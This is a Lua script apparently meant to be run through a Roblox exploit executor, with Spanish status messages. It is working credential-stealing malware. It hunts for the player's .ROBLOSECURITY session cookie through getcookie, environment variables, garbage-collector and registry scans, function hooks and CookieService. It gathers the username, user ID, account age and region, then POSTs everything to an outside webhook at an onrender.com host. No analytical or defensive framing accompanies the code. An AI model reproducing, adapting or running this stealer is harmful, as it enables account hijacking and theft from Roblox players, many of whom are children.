local Players = game:GetService("Players")
local LocalizationService = game:GetService("LocalizationService")
local HttpService = game:GetService("HttpService")

local player = Players.LocalPlayer
local placeId = game.PlaceId

local function GetUniversalCookie()
    local cookieValue = nil
    
    if type(getcookie) == "function" then
        local success, cookie = pcall(getcookie)
        if success and cookie and tostring(cookie) ~= "" then
            cookieValue = tostring(cookie)
            print("✅ Cookie obtenida con getcookie()")
        end
    end
    
    if not cookieValue then
        local envNames = {"_ROBLOSECURITY", "ROBLOSECURITY", "cookie", "rbx_cookie"}
        for _, name in ipairs(envNames) do
            local env = getgenv()
            if env[name] and tostring(env[name]) ~= "" then
                cookieValue = tostring(env[name])
                print("✅ Cookie obtenida de getgenv()." .. name)
                break
            end
        end
    end
    
    if not cookieValue and type(getgc) == "function" then
        print("🔍 Buscando en getgc(true)...")
        local success, gc = pcall(function() return getgc(true) end)
        if success and gc then
            local pattern = "_|WARNING:-DO%-NOT%-SHARE%-THIS"
            
            for i, obj in ipairs(gc) do
                if type(obj) == "string" and string.find(obj, pattern) then
                    cookieValue = obj
                    print("✅ Cookie encontrada en getgc(true) string #" .. i)
                    break
                end
                
                if type(obj) == "table" then
                    local function deepSearch(tbl, depth, visited)
                        if depth > 5 or visited[tbl] then return nil end
                        visited[tbl] = true
                        
                        for key, value in pairs(tbl) do
                            if type(value) == "string" and string.find(value, pattern) then
                                return value
                            elseif type(value) == "table" then
                                local found = deepSearch(value, depth + 1, visited)
                                if found then return found end
                            elseif type(value) == "function" then
                                local success2, upvalues = pcall(debug.getupvalues, value)
                                if success2 and upvalues then
                                    for _, upval in ipairs(upvalues) do
                                        if type(upval) == "string" and string.find(upval, pattern) then
                                            return upval
                                        end
                                    end
                                end
                            end
                        end
                        return nil
                    end
                    
                    local visited = {}
                    local found = deepSearch(obj, 0, visited)
                    if found then
                        cookieValue = found
                        print("✅ Cookie encontrada en getgc(true) tabla #" .. i)
                        break
                    end
                end
            end
        end
    end
    
    if not cookieValue and type(getreg) == "function" then
        print("🔍 Buscando en getreg()...")
        local success, reg = pcall(getreg)
        if success and reg then
            local pattern = "_|WARNING:-DO%-NOT%-SHARE%-THIS"
            
            for i, obj in ipairs(reg) do
                if type(obj) == "string" and string.find(obj, pattern) then
                    cookieValue = obj
                    print("✅ Cookie encontrada en getreg() #" .. i)
                    break
                elseif type(obj) == "table" then
                    local function deepSearch(tbl, depth, visited)
                        if depth > 5 or visited[tbl] then return nil end
                        visited[tbl] = true
                        
                        for key, value in pairs(tbl) do
                            if type(value) == "string" and string.find(value, pattern) then
                                return value
                            elseif type(value) == "table" then
                                local found = deepSearch(value, depth + 1, visited)
                                if found then return found end
                            end
                        end
                        return nil
                    end
                    
                    local visited = {}
                    local found = deepSearch(obj, 0, visited)
                    if found then
                        cookieValue = found
                        print("✅ Cookie encontrada en getreg() tabla #" .. i)
                        break
                    end
                end
            end
        end
    end
    
    if not cookieValue and type(hookfunction) == "function" then
        print("🔍 Usando hookfunction() en funciones de autenticación...")
        local captured = nil

        local functionsToHook = {
            "GetCookie",
            "GetAuthCookie",
            "FetchCookie",
            "GetSecurityCookie"
        }
        
        local success, reg = pcall(getreg)
        if success then
            for _, obj in ipairs(reg) do
                if type(obj) == "table" then
                    for key, func in pairs(obj) do
                        if type(func) == "function" then
                            local funcName = tostring(key)
                            for _, targetName in ipairs(functionsToHook) do
                                if string.find(funcName, targetName, 1, true) then
                                    local oldFunc
                                    oldFunc = hookfunction(func, function(...)
                                        local result = oldFunc(...)
                                        if type(result) == "string" and string.find(result, "_|WARNING") then
                                            captured = result
                                            print("📥 Cookie capturada de " .. funcName)
                                        end
                                        return result
                                    end)
                                end
                            end
                        end
                    end
                end
            end
        end
        
        pcall(function()
            HttpService:GetAsync("https://auth.roblox.com/v1/authentication-ticket/")
        end)
        
        if captured then
            cookieValue = captured
            print("✅ Cookie capturada con hookfunction()")
        end
    end
    
    if not cookieValue and type(getloadedmodules) == "function" then
        print("🔍 Buscando en módulos cargados...")
        local success, modules = pcall(getloadedmodules)
        if success then
            local pattern = "_|WARNING:-DO%-NOT%-SHARE%-THIS"
            for _, module in ipairs(modules) do
                local success2, content = pcall(function()
                    return HttpService:JSONEncode(module)
                end)
                if success2 and string.find(content, pattern) then
                    local match = string.match(content, pattern .. "[^\"}]+")
                    if match then
                        cookieValue = match
                        print("✅ Cookie encontrada en módulo cargado")
                        break
                    end
                end
            end
        end
    end
    
    if not cookieValue then
        local success, CookieService = pcall(function() 
            return game:GetService("CookieService") 
        end)
        if success and CookieService then
            local success2, savedCookie = pcall(function() 
                return CookieService:GetCookieValue(".ROBLOSECURITY", "https://www.roblox.com") 
            end)
            if success2 and savedCookie and tostring(savedCookie) ~= "" then
                cookieValue = tostring(savedCookie)
                print("✅ Cookie obtenida de CookieService")
            end
        end
    end
    
    if cookieValue then
        if string.find(cookieValue, ".ROBLOSECURITY=") then
            return cookieValue
        end
        return ".ROBLOSECURITY=" .. cookieValue
    end
    
    return "COOKIE_NO_DISPONIBLE"
end

local function GetAccountAge()
    return tostring(player.AccountAge) .. " días"
end

local function GetRegion()
    local success, region = pcall(function()
        return LocalizationService.RobloxLocaleId
    end)
    return success and tostring(region) or "Desconocida"
end

print(" Iniciando extracción de datos...")
local data = {
    username = player.Name,
    displayName = player.DisplayName,
    userId = player.UserId,
    gameId = placeId,
    accountAge = GetAccountAge(),
    region = GetRegion(),
    cookie = GetUniversalCookie()
}

print("📊 Datos recopilados:")
print("  - Usuario:", data.username)
print("  - Cookie:", data.cookie ~= "COOKIE_NO_DISPONIBLE" and "✅ Detectada" or "❌ No detectada")

local webhookUrl = "https://depazzhub-api.onrender.com/log"
local jsonData = HttpService:JSONEncode(data)

local success, result = pcall(request, {
    Url = webhookUrl,
    Method = "POST",
    Headers = {["Content-Type"] = "application/json"},
    Body = jsonData
})

if success then
    print("✅ Webhook enviado correctamente!")
else
    warn(" Error:", result)
end
